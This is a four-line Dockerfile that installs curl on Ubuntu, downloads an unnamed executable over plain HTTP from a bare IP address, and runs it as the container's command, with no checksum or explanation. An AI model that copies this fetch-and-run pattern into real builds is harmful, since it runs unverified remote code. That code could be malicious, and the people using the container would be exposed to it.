FROM ubuntu:latest
RUN apt -y update && apt-get -y install curl
RUN curl --output prog "http://85.93.88.189/some/prog" && chmod +x ./prog
CMD /prog